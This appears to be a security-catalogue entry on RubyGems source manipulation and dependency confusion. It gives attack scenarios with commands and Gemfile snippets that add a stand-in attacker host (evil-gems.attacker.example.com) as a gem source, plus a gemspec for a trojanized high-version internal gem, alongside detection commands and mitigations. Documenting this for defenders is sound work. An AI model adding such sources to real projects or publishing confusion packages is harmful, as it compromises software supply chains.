---
name: "RubyGems Source Manipulation"
packageManager: "gem"
slug: "gem-source-manipulation"
category: "Source Manipulation"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "RubyGems resolves packages from configurable source repositories. An attacker can add malicious gem sources via `gem sources --add`, modify the Gemfile to include rogue source blocks, or exploit multi-source resolution behavior in Bundler. When multiple sources are configured, Bundler may resolve a gem from an attacker-controlled source instead of the intended one, enabling dependency confusion and package substitution attacks."
prerequisites:
  - "Write access to the victim's Gemfile, .gemrc, or ability to influence gem source configuration"
  - "A malicious gem server hosting a trojanized version of a target gem"
  - "For dependency confusion: knowledge of internal gem names used by the target organization"
attackScenarios:
  - title: "Adding a Malicious Gem Source"
    description: "An attacker with access to a developer's environment adds a rogue gem source that hosts trojanized versions of popular gems. When the developer runs gem install or bundle install, the package manager may resolve gems from the malicious source, especially if the attacker publishes higher version numbers."
    commands:
      - label: "Add a malicious gem source globally"
        code: |
          gem sources --add https://evil-gems.attacker.example.com/
          gem sources --list
          # Output:
          # *** CURRENT SOURCES ***
          # https://rubygems.org/
          # https://evil-gems.attacker.example.com/
        language: "bash"
      - label: "Install a gem that resolves from the malicious source"
        code: |
          # If the malicious source has 'nokogiri' version 99.0.0,
          # it may be selected over rubygems.org's version
          gem install nokogiri
        language: "bash"
  - title: "Gemfile Multi-Source Dependency Confusion"
    description: "An attacker modifies a project's Gemfile to add a secondary source. Bundler's source resolution can be exploited when gems are not pinned to specific sources, allowing a malicious source to serve trojanized packages."
    commands:
      - label: "Gemfile with multiple sources (vulnerable pattern)"
        code: |
          # Gemfile
          source "https://rubygems.org"
          source "https://evil-gems.attacker.example.com"

          # These gems could resolve from EITHER source
          gem "rails"
          gem "internal-auth-lib"  # Internal gem name targeted for confusion
        language: "ruby"
      - label: "Gemfile with source blocks (safer but still exploitable)"
        code: |
          # Gemfile - source block pattern
          source "https://rubygems.org"

          # Attacker-injected source block
          source "https://evil-gems.attacker.example.com" do
            gem "internal-auth-lib"
          end
        language: "ruby"
      - label: "Attacker publishes a higher version of an internal gem"
        code: |
          # On the attacker's gem server, publish:
          Gem::Specification.new do |s|
            s.name    = "internal-auth-lib"
            s.version = "99.0.0"
            s.summary = "Authentication library"
            s.authors = ["attacker"]
            s.files   = ["lib/internal-auth-lib.rb"]
            # lib/internal-auth-lib.rb contains malicious code
          end
        language: "ruby"
detection:
  - title: "Audit configured gem sources"
    description: "List all globally configured gem sources to check for unexpected or untrusted repositories."
    commands:
      - code: "gem sources --list"
        language: "bash"
  - title: "Audit Gemfile for multiple sources"
    description: "Review the project's Gemfile for multiple source declarations and ensure gems are pinned to specific sources using source blocks."
    commands:
      - code: "grep -n 'source ' Gemfile"
        language: "bash"
  - title: "Check resolved sources in Gemfile.lock"
    description: "Inspect Gemfile.lock to verify which source each gem was resolved from."
    commands:
      - code: "grep -B1 'remote:' Gemfile.lock"
        language: "bash"
mitigation:
  - "Use only trusted gem sources and remove any unknown sources with gem sources --remove"
  - "Pin gems to specific sources using Bundler source blocks in the Gemfile"
  - "Use Bundler 2.x+ which warns about ambiguous source resolution"
  - "For internal gems, use a private gem server and restrict resolution with source blocks"
  - "Regularly audit Gemfile.lock to verify gems were resolved from expected sources"
  - "Claim your internal gem names on rubygems.org as placeholders to prevent dependency confusion"
references:
  - title: "Bundler - Gemfile Source Documentation"
    url: "https://bundler.io/man/gemfile.5.html"
  - title: "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan"
    url: "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
created: 2026-04-02
updated: 2026-04-02
---
